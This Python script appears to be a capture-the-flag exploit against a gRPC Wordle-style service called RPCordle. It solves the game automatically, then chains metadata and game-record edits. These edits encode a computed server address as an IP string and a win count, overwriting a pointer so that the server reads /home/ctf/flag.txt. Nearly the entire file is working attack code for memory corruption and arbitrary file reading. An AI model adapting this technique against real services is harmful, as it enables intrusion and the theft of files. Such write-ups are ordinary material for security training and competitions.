import sys
import socket
import struct

import grpc
import rpcordle_pb2
import rpcordle_pb2_grpc


def main(endpoint):
    with grpc.insecure_channel(endpoint) as channel:
        stub = rpcordle_pb2_grpc.RPCordleServerStub(channel)
        response = stub.GetWordlist(rpcordle_pb2.GetWordlistRequest())
        wordlist = response.word
        #print(wordlist)
        for i in range(32):
            try:
                stub.EndGame(rpcordle_pb2.EndGameRequest(gameid=i))
            except grpc.RpcError as e:
                if e.code() != grpc.StatusCode.NOT_FOUND:
                    print(e)
            except Exception as ex:
                print(ex)
        response = stub.StartGame(rpcordle_pb2.StartGameRequest())
        print('Started game %d on server %x' % (response.gameid,
            response.serverid))
        target_addr = response.serverid + 280
        gameid = response.gameid
        stub.SetMetadata(rpcordle_pb2.SetMetadataRequest(
            gameid=gameid,
            client_ip="192.168.1.1",
            game_streak=0x41414141,
            ))
        game_record_id = solve_game(stub, gameid, wordlist)
        if game_record_id is None:
            print('Unable to solve!')
            return
        print('Got game record %d' % game_record_id)
        game_record = stub.GetGameRecord(rpcordle_pb2.GameRecordRequest(
            game_record_id=game_record_id))
        print(game_record)
        game_record = stub.EditGameRecord(rpcordle_pb2.GameRecordEditRequest(
            game_record_id=game_record_id,
            name=b"hello world"))
        print(game_record)
        ip, wins = ip_and_wins(target_addr)
        stub.SetMetadata(rpcordle_pb2.SetMetadataRequest(
            gameid=gameid,
            client_ip=ip,
            game_streak=wins,
            ))
        game_record = stub.EditGameRecord(rpcordle_pb2.GameRecordEditRequest(
            game_record_id=game_record_id,
            name=b"/home/ctf/flag.txt"))
        print(game_record)
        response = stub.GetWordlist(rpcordle_pb2.GetWordlistRequest())
        print('\n'.join(response.word))


def ip_and_wins(pointer):
    low_word = pointer & 0xFFFFFFFF
    hi_word = pointer >> 32
    low_bytes = struct.pack('<I', low_word)
    ip = socket.inet_ntoa(low_bytes)
    return ip, hi_word


def solve_game(stub, gameid, wordlist):
    known = [None, None, None, None, None]
    word = 'steam'
    while True:
        print('Trying %s' % word)
        response = stub.SubmitGuess(
                rpcordle_pb2.GuessRequest(
                    gameid=gameid,
                    guess=word))
        if response.win:
            print('Won game %d with %s: %d' % (
                gameid, word, response.game_record_id))
            return response.game_record_id
        print(response.positions)
        for i, p in enumerate(response.positions):
            # These have to be applied first
            if p == rpcordle_pb2.GuessPosition.CORRECT:
                known[i] = word[i]
                print('%s in position %d' % (word[i], i))
                wordlist = [w for w in wordlist if w[i] == word[i]]
        for i, p in enumerate(response.positions):
            if p == rpcordle_pb2.GuessPosition.NOT_IN_WORD:
                occurs = False
                for k in range(len(word)):
                    if i == k:
                        continue
                    if (word[i] == word[k] and
                            response.positions[k] !=
                            rpcordle_pb2.GuessPosition.NOT_IN_WORD):
                        occurs = True
                if not occurs:
                    print('%s not in word' % word[i])
                    wordlist = [w for w in wordlist if word[i] not in w]
            elif p == rpcordle_pb2.GuessPosition.WRONG_POSITION:
                print('%s not in position %d' % (word[i], i))
                # Must contain this letter
                wordlist = [w for w in wordlist if word[i] in w]
                # Must not be at this position
                wordlist = [w for w in wordlist if w[i] != word[i]]
        print("%d words left" % len(wordlist))
        if not wordlist:
            return None
        word = wordlist[0]


if __name__ == '__main__':
    main(sys.argv[1])
